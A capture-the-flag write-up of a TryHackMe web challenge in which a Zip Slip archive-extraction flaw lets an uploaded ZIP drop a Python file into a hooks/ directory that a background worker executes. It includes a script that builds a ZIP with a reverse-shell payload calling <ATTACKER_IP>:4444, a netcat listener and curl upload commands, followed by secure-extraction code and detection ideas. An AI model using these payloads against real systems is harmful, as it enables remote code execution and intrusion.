# The Hollow Shell — Zip Slip to Remote Code Execution

**Platform:** TryHackMe
**Category:** Web / Exploitation
**Difficulty:** Medium
**Points:** 90
**Technique:** Zip Slip → Arbitrary File Write → Hook Execution → Reverse Shell

**Flag:** `THM{XXXX}`

---

## 1. Overview

The challenge revolves around a staff portal that accepts ZIP archives containing custom "shell packs."

At first glance, the upload functionality appears restricted to specific asset types. However, the server extracts archive entries without properly validating their paths.

This creates a **Zip Slip vulnerability**.

The important part is that the arbitrary file write can eventually reach a directory monitored by a background process. That process automatically executes Python files placed inside its `hooks/` directory.

The complete attack path is:

```text
Login
  ↓
Find ZIP upload functionality
  ↓
Upload arbitrary files
  ↓
Confirm directory traversal
  ↓
Determine application directory structure
  ↓
Identify the hooks/ execution mechanism
  ↓
Write a Python payload into hooks/
  ↓
Theme worker executes payload
  ↓
Reverse shell
  ↓
Read flag
```

---

## 2. Initial Access

The application exposes a login page on port `5000`.

While inspecting the HTML source, a comment reveals the default credentials:

```html
<!-- IT seeds every property with the same starter login:
     user: concierge / pass: StayNoticed2024! -->
```

The credentials can be submitted with `curl`:

```bash
curl -s -i -c cookie.txt \
  -X POST http://$IP:5000/login \
  -d 'username=concierge&password=StayNoticed2024!'
```

The session cookie is stored in `cookie.txt` and can be reused for authenticated requests.

---

## 3. Investigating the Upload Feature

After logging in, the application presents the **Shoreline Display** portal.

The portal allows users to upload a ZIP-based "shell pack." A normal package contains files such as:

```text
shell.json
theme.css
assets/
```

There is also an interesting message on the page:

> A theme worker applies automation hooks shortly after the shell comes ashore.

That wording becomes important later.

### Testing the file restrictions

The interface suggests that only certain extensions are accepted:

```text
png
jpg
gif
svg
css
json
```

However, this restriction does not appear to be enforced during extraction.

For example, a ZIP containing:

```text
shell.json
test.css
sneaky.py
```

can still be uploaded.

After extraction, the supposedly forbidden file can be requested:

```bash
curl -i http://$IP:5000/shells/<ID>/sneaky.py
```

The server returns the uploaded content.

This confirms that the extension check is effectively cosmetic.

---

## 4. Discovering Zip Slip

The next question is whether the archive extractor safely handles paths.

A ZIP entry can contain traversal sequences such as:

```text
../
../../
../../../
```

A small test archive can be generated to determine how far the extraction path can escape:

```python
import zipfile

z = zipfile.ZipFile("/tmp/multi.zip", "w")

z.write("shell.json")
z.write("ok.css")

for depth in range(1, 6):
    z.writestr(
        "../" * depth + f"slipmarker/depth{depth}.txt",
        f"depth {depth}"
    )

    z.writestr(
        "../" * depth + f"static/smark{depth}.txt",
        f"static {depth}"
    )

z.close()
```

The resulting files reveal the directory layout.

### Observed results

```text
../       → shells/
../../    → application root
../../static/ → application's static directory
```

Therefore, if an uploaded archive is extracted under:

```text
<APP_ROOT>/shells/<ID>/
```

then:

```text
../../
```

allows the extraction process to reach:

```text
<APP_ROOT>/
```

This proves that the archive extractor is vulnerable to **Zip Slip**.

---

## 5. Why Arbitrary Write Is Not Enough

At this stage we have:

```text
ZIP upload
    ↓
Path traversal
    ↓
Arbitrary file write
```

But arbitrary file writing does not automatically mean code execution.

Writing a Python file into a static directory, for example, would normally just make it downloadable.

The next objective is therefore to find a location where the application automatically executes files.

The earlier portal message provides the clue:

> automation hooks

This suggests looking for a `hooks/` directory and understanding how the theme worker processes it.

---

## 6. Finding the Hook Worker

The relevant worker logic uses the application root as its base directory:

```python
HOOKS_DIR = os.path.join(BASE_DIR, "hooks")
POLL_SECONDS = 20
```

The worker periodically searches for Python files:

```python
glob.glob(os.path.join(HOOKS_DIR, "*.py"))
```

For each matching file, it reads the source, removes the file, and sends the contents to Python for execution.

Conceptually:

```text
hooks/
 ├── hook1.py
 ├── hook2.py
 └── ...
       ↓
   theme worker
       ↓
     python3
```

The worker checks the directory approximately every **20 seconds**.

This gives us the final target:

```text
<APP_ROOT>/hooks/rev.py
```

Since our ZIP extraction can reach the application root, the traversal entry becomes:

```text
../../hooks/rev.py
```

---

## 7. Building the Payload

A Python reverse-shell payload can be embedded directly into the ZIP archive.

Example:

```python
import zipfile

z = zipfile.ZipFile("/tmp/hk.zip", "w")

z.write("shell.json")
z.write("a.css")

payload = (
    'import socket,subprocess,os\n'
    's=socket.socket();'
    's.connect(("<ATTACKER_IP>",4444))\n'
    'os.dup2(s.fileno(),0)\n'
    'os.dup2(s.fileno(),1)\n'
    'os.dup2(s.fileno(),2)\n'
    'subprocess.call(["/bin/bash","-i"])\n'
)

z.writestr("../../hooks/rev.py", payload)

z.close()
```

The important detail is the archive filename:

```text
../../hooks/rev.py
```

It does not need to physically exist in the upload directory. The vulnerable extractor creates it at the traversed destination.

---

## 8. Catching the Reverse Shell

Start a listener on the AttackBox:

```bash
nc -lvnp 4444
```

Then upload the malicious archive using the authenticated session:

```bash
curl -s -b cookie.txt \
  -F "shell=@/tmp/hk.zip" \
  http://$IP:5000/upload \
  -o /dev/null -L
```

The worker does not necessarily execute the payload immediately.

It checks the directory on its polling interval, so waiting around **20 seconds** may be necessary.

Eventually the Python hook is processed and the reverse connection arrives.

The resulting shell runs as:

```text
roomservice
```

---

## 9. Retrieving the Flag

Once the shell is available, the current privileges can be checked:

```bash
id
```

Potential flag locations can then be searched:

```bash
find / -name '*flag*' 2>/dev/null
```

Or:

```bash
cat /home/*/flag.txt 2>/dev/null
cat /app/flag.txt 2>/dev/null
cat /root/flag.txt 2>/dev/null
```

The challenge flag is:

```text
THM{XXXX}
```

---

# Vulnerability Analysis

## Zip Slip

The primary vulnerability is unsafe archive extraction.

A vulnerable implementation effectively does:

```text
destination = upload_directory + zip_entry_name
```

without checking whether the resulting path remains inside the intended directory.

Therefore:

```text
../../hooks/rev.py
```

can escape the upload directory.

---

## Weak File Validation

The portal displays an extension allow-list, but the extractor still writes unsupported files.

For example:

```text
sneaky.py
```

can be extracted even though `.py` is not part of the advertised asset types.

This means validation exists only at the interface level rather than being reliably enforced during processing.

---

## Dangerous Automation

The most important escalation point is the background worker.

It trusts files appearing in:

```text
hooks/
```

and executes files ending in:

```text
.py
```

Because the ZIP vulnerability lets an attacker write into that directory, the upload functionality effectively becomes a code-execution primitive.

The chain is therefore:

```text
Untrusted ZIP
     ↓
Path Traversal
     ↓
Arbitrary File Write
     ↓
hooks/rev.py
     ↓
Automatic Execution
     ↓
RCE
```

---

# Important Lessons

### 1. Follow application clues

The portal practically disclosed the execution mechanism through its description of the **theme worker** and **automation hooks**.

When arbitrary file write is discovered, the next question should be:

> "What locations does this application automatically process or execute?"

---

### 2. Match the payload to the worker

The worker searches specifically for:

```text
*.py
```

Therefore a file such as:

```text
rev.sh
```

will not be processed.

The successful payload needs to be:

```text
rev.py
```

The polling interval also matters. Checking immediately after upload can make a working exploit appear broken.

---

### 3. Arbitrary write ≠ immediate RCE

A Zip Slip vulnerability alone provides file-write capability.

RCE requires a useful execution sink:

```text
cron
startup scripts
web-interpreted files
application configuration
watched directories
automation hooks
```

In this challenge, the execution sink was:

```text
hooks/
```

---

# Defensive Recommendations

## Secure ZIP extraction

Every archive entry should be resolved and verified before writing.

Conceptually:

```python
base = os.path.realpath(upload_directory)
target = os.path.realpath(
    os.path.join(base, entry.filename)
)

if not target.startswith(base + os.sep):
    raise ValueError("Unsafe archive path")
```

Absolute paths and traversal sequences should also be rejected.

---

## Enforce the file allow-list server-side

Do not rely on the frontend or filename alone.

Unsupported files should be rejected during extraction and processing.

Where appropriate, validate file contents rather than trusting extensions.

---

## Separate uploads from executable content

The safest design is to ensure that an upload-controlled directory can never contain executable hooks.

Trusted automation scripts should live in a directory that the upload process cannot modify.

---

## Reduce worker privileges

The worker should run with the minimum permissions required.

Additional isolation can include:

```text
Dedicated service account
Container isolation
Filesystem restrictions
Network egress controls
Seccomp/AppArmor
```

---

# Detection Ideas

Defenders can monitor for several indicators.

### Unexpected archive traversal

Look for archive extraction creating files outside the expected upload directory.

### Suspicious hook creation

A new `.py` file appearing inside a hooks directory immediately after an upload is highly suspicious.

### Process anomalies

A web application or worker spawning:

```text
bash
sh
python
```

unexpectedly should generate an alert.

### Network anomalies

Unexpected outbound connections from the web application or worker process can indicate reverse-shell activity.

---

# Final Attack Chain

```text
┌─────────────────────┐
│   Default Login     │
└──────────┬──────────┘
           ↓
┌─────────────────────┐
│    ZIP Upload       │
└──────────┬──────────┘
           ↓
┌─────────────────────┐
│   Zip Slip Found    │
│  ../../ traversal   │
└──────────┬──────────┘
           ↓
┌─────────────────────┐
│ Arbitrary File Write│
└──────────┬──────────┘
           ↓
┌─────────────────────┐
│    hooks/rev.py     │
└──────────┬──────────┘
           ↓
┌─────────────────────┐
│   Theme Worker      │
│    executes *.py    │
└──────────┬──────────┘
           ↓
┌─────────────────────┐
│   Reverse Shell     │
│    roomservice      │
└──────────┬──────────┘
           ↓
┌─────────────────────┐
│       FLAG          │
│     THM{XXXX}       │
└─────────────────────┘
```

## Takeaway

The interesting part of this challenge was not simply finding Zip Slip. The real escalation came from connecting three separate pieces:

**unsafe extraction + application directory traversal + an automated hook executor.**

Once those pieces were understood, the path from a harmless-looking ZIP upload to RCE became straightforward.

> **Find the write primitive. Find what executes. Connect the two.**
